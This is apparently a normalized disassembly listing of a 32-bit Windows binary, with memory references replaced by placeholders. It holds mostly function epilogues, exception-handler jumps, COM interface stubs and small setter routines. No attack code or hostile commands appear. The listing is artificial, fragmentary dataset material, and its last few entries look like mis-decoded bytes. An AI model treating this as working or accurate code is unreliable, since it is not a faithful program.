mov esp ebp
pop ebp
retn
sub_466e13
jmp sub_403970
sub_466e1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466e74
jmp sub_403970
sub_466e7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466f22
jmp sub_403970
sub_466f29
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036bc
jmp sub_4036bc
sub_467110
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4672b0
jmp sub_403970
sub_4672b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4672da
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4662a0
sub_4672d3
jmp sub_403970
j_sub_4037e8#2
jmp sub_4037e8
sub_467481
jmp sub_403970
sub_46750b
jmp sub_403970
sub_4675f0
jmp sub_403970
sub_46760d
jmp sub_403970
sub_467614
mov esp ebp
pop ebp
retn
sub_467790
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4677a8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4677c0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4677cc
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_4677e4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_4677fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_466508
xor eax eax
pop ebp
retn 0x4
sub_467810
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4678c0
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_467990
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_4679ec
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_467b38
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_40599c
lea eax [ ebx + 0x22c ]
call sub_40599c
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_467bc0
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_467bf0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_446ed8
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_467cac
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_467cb8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_467cc4
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_467cf4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_467de5
mov eax ebx
mov edx [ esi + 0x68 ]
mov edx [ edx + 0x18 ]
mov cl 0xfc
call sub_41357c
jmp sub_467e6e
sub_467df6
call GetUserDefaultLCID
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_41357c
jmp sub_467e6e
sub_467e08
mov eax ebx
mov dl 0x1
call sub_41374c
jmp sub_467e6e
sub_467e13
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
xor dl 0x1
call sub_41374c
jmp sub_467e6e
sub_467e26
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
call sub_41374c
jmp sub_467e6e
sub_467e36
mov eax ebx
xor edx edx
call sub_41374c
jmp sub_467e6e
sub_467e41
mov eax ebx
xor edx edx
call sub_41374c
jmp sub_467e6e
sub_467e4c
mov eax ebx
mov dl 0x1
call sub_41374c
jmp sub_467e6e
sub_467e57
mov eax ebx
mov dl 0x1
call sub_41374c
jmp sub_467e6e
sub_467e6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467e96
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
retn
sub_467e8f
jmp sub_403970
sub_467e96
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_467f44
jmp sub_403970
sub_467fa7
jmp sub_403970
sub_46800c
jmp sub_403970
sub_468069
jmp sub_403970
j_sub_4037e8
jmp sub_4037e8
sub_4680a8
jmp sub_403970
sub_4680af
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4680bc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4680c8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_4680d4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_468111
jmp sub_403970
sub_468118
pop ebp
retn
sub_468164
jmp sub_403970
sub_46816b
pop ebp
retn
sub_468195
jmp sub_403970
sub_46819c
pop ebp
retn
sub_4681a0
sub [ rw-data ] 0x1
retn
sub_468205
jmp sub_403970
sub_46820c
pop ebp
retn
sub_468210
sub [ rw-data ] 0x1
retn
sub_46825d
jmp sub_403970
sub_468264
pop ebp
retn
sub_468268
sub [ rw-data ] 0x1
retn
sub_468528
add eax 0x4
call sub_4684f0
retn
sub_4686f4
push ebx
mov ebx eax
mov dx [ ebx + 0x6 ]
mov ax [ ebx + 0x4 ]
call sub_4681a8
movzx eax ax
pop ebx
retn
sub_468838
add esp 0xfffffff8
add eax 0x4
call sub_468e98
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_4689e0
mov [ eax + 0x8 ] dx
retn
sub_4689e8
mov [ eax + 0x10 ] edx
retn
sub_4689ec
mov [ eax + 0xa ] dx
retn
sub_4689f4
mov [ eax + 0xc ] dx
retn
sub_4689fc
mov [ eax + 0x6 ] dx
retn
sub_468a04
mov [ eax + 0xe ] dx
retn
sub_468a0c
mov [ eax + 0x4 ] dx
retn
sub_468a14
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d3ac
retn
sub_468afa
jmp sub_403970
sub_468b27
jmp sub_403970
sub_468b2e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b4b
lea eax [ ebp - 0x2c ]
call sub_403f6c
retn
sub_468b44
jmp sub_403970
sub_468b4b
pop ebx
mov esp ebp
pop ebp
retn
sub_468c30
jmp sub_403970
sub_468c67
jmp sub_403970
sub_468c6e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_468cc4
mov eax [ edx + 0x8 ]
retn
sub_468e41
jmp sub_403970
sub_468e48
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46901c
jmp sub_403970
sub_469023
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46905d
jmp sub_403970
sub_469064
pop ebp
retn
sub_469068
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414da8
mov [ rw-data ] eax
sub_469394
jmp sub_403970
sub_46939b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4693a4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
pop ebx
retn
sub_4693bc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
pop ebx
retn
sub_4693fc
add edx 0x4
call sub_4693d4
retn
sub_469430
add edx 0x4
call sub_469408
retn
sub_469494
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_46bc64
inc eax
pop esi
pop ebx
retn
sub_469509
jmp sub_403970
sub_469510
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_469559
jmp sub_403970
sub_469560
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_469568
push ebx
mov ebx eax
mov eax ebx
call sub_469518
pop ebx
retn
sub_469574
add esp 0xfffffff8
mov edx esp
add eax 0x4
call sub_46c594
fild [ esp ]
pop ecx
pop edx
retn
sub_469610
jmp sub_403970
sub_469617
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46967a
jmp sub_403970
sub_469681
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469688
movsx edx dx
call sub_469620
retn
sub_469694
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
add eax 0x4
mov ecx 0x4
mov edx 0x20
call sub_46c508
pop ebp
retn 0x8
sub_46979c
jmp sub_403970
sub_46984b
jmp sub_403970
sub_4698b0
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d3ac
retn
sub_4699a0
jmp sub_403970
sub_4699cd
jmp sub_403970
sub_4699d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4699f1
lea eax [ ebp - 0x2c ]
call sub_403f6c
retn
sub_4699ea
jmp sub_403970
sub_4699f1
pop ebx
mov esp ebp
pop ebp
retn
sub_469adb
jmp sub_403970
sub_469b12
jmp sub_403970
sub_469b19
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_469bc4
mov eax [ edx + 0x8 ]
retn
sub_469c36
jmp sub_403970
sub_469c3d
pop ebx
pop ecx
pop ebp
retn
sub_469c8c
jmp sub_403970
sub_469c93
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_469dba
jmp sub_403970
sub_469dc1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469eb6
jmp sub_403970
sub_469ebd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46a05c
jmp sub_403970
sub_46a063
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_46a263
jmp sub_403970
sub_46a26a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a46a
jmp sub_403970
sub_46a471
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a669
jmp sub_403970
sub_46a670
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a994
jmp sub_403970
sub_46a99b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ab69
jmp sub_403970
sub_46ab70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46ad0d
jmp sub_403970
sub_46ad14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46af87
jmp sub_403970
sub_46af8e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b11d
jmp sub_403970
sub_46b124
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b214
jmp sub_403970
sub_46b21b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b641
jmp sub_403970
sub_46b648
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46be51
jmp sub_403970
sub_46be58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bebc
jmp sub_403970
sub_46bec3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c002
jmp sub_403970
sub_46c009
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c078
jmp sub_403970
sub_46c07f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c35f
jmp sub_403970
sub_46c4b7
jmp sub_403970
sub_46c4be
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c4fc
mov al [ eax + 0x1 ]
and al 0x3f
and eax 0xff
retn
sub_46c65d
jmp sub_403970
sub_46c664
pop ebp
retn
sub_46c668
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414da8
mov [ rw-data ] eax
sub_46c959
add eax 0xffffffec
jmp r-xdata
retn
sub_46c961
add eax 0xffffffec
jmp sub_46cabc
sub_46c973
add [ esp + 0x4 ] 0xffffffec
jmp sub_405a70
sub_46c987
add eax 0xffffffe8
jmp r-xdata
mov al [ eax + 0xc ]
retn
sub_46c98f
add eax 0xffffffe8
jmp r-xdata
mov [ eax + 0xc ] dl
retn
sub_46c9a1
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405a70
sub_46cabc
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
sub_46cb20
jmp sub_403970
sub_46cb27
pop ebp
retn
sub_46cb8d
jmp sub_403970
sub_46cb94
pop ebp
retn
sub_46cbc1
inc esi
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cbe4
retn
sub_46cbdd
jmp sub_403970
sub_46cbe4
pop ebp
retn
sub_46cbe8
sub [ rw-data ] 0x1
retn
sub_46cc6d
jmp sub_403970
sub_46cc74
pop ebp
retn
sub_46cc78
sub [ rw-data ] 0x1
retn
sub_46cfa6
jmp sub_403970
sub_46cfad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cfcf
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
sub_46cfc8
jmp sub_403970
sub_46cfcf
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d0d6
jmp sub_403970
sub_46d0dd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d0ff
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
j_sub_403970#9
jmp sub_403970
sub_46d0ff
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d290
jmp sub_403970
sub_46d297
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2c1
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_46d2ba
jmp sub_403970
sub_46d2c1
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d314
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45e40c
retn
j_sub_403970#8
jmp sub_403970
sub_46d350
pop ebp
retn
sub_46d68a
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_46d693
jmp sub_403970
j_sub_46d68a
jmp sub_46d68a
sub_46d69a
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403970#7
jmp sub_403970
sub_46d725
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403970#6
jmp sub_403970
sub_46d79e
pop ebx
pop ecx
pop ebp
retn
sub_46d808
jmp sub_403970
sub_46d80f
pop ebx
pop ecx
pop ebp
retn
sub_46d814
push ebx
mov ebx eax
mov eax [ ebx + 0x318 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
pop ebx
retn
sub_46d87c
jmp sub_403970
sub_46d883
pop ebx
pop ecx
pop ebp
retn
j_sub_403970#5
jmp sub_403970
sub_46d8bf
pop ebp
retn
sub_46d8c4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov [ eax ] r-xdata
sub_46d8dd
add eax 0xfffffff4
jmp sub_46da3c
sub_46d8e5
add eax 0xfffffff4
jmp sub_46da50
sub_46d8ed
add eax 0xfffffff4
jmp sub_46daa0
sub_46d8ff
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405a70
sub_46d91b
add eax 0xfffffff0
jmp sub_46da60
sub_46d92d
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405a70
sub_46da3c
push ebx
mov ebx edx
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff38
pop ebx
retn
sub_46da50
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460278
retn
sub_46daa0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff84
retn
j_sub_403970#4
jmp sub_403970
sub_46db6e
pop ebp
retn
sub_46dc04
retn
j_sub_403970#3
jmp sub_403970
j_sub_46dc04
jmp sub_46dc04
sub_46dc0c
pop ebp
retn
sub_46dc10
sub [ rw-data ] 0x1
retn
sub_46dc3d
jmp sub_403970
sub_46dc44
pop ebp
retn
sub_46dc48
sub [ rw-data ] 0x1
retn
sub_46dc75
jmp sub_403970
sub_46dc7c
pop ebp
retn
sub_46dc80
sub [ rw-data ] 0x1
retn
sub_46dcad
jmp sub_403970
sub_46dcb4
pop ebp
retn
sub_46dcb8
sub [ rw-data ] 0x1
retn
sub_46dce5
jmp sub_403970
sub_46dcec
pop ebp
retn
sub_46dcf0
sub [ rw-data ] 0x1
retn
sub_46de6c
jmp sub_403970
sub_46de73
pop ebx
pop ecx
pop ebp
retn
sub_46df21
jmp sub_403970
sub_46df28
pop ebp
retn
sub_46df2c
sub [ rw-data ] 0x1
retn
sub_46e188
pop ebp
retn
j_sub_403970#2
jmp sub_403970
sub_46e56b
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_403970
jmp sub_403970
sub_46e5ba
pop ebp
retn
sub_46e6a9
iretd
sub_46e6f6
inc edx
add [ eax - 0x4fffbd31 ] bh
iretd
sub_46e80e
inc esi
add [ eax + 0x780046cb ] bh
int3
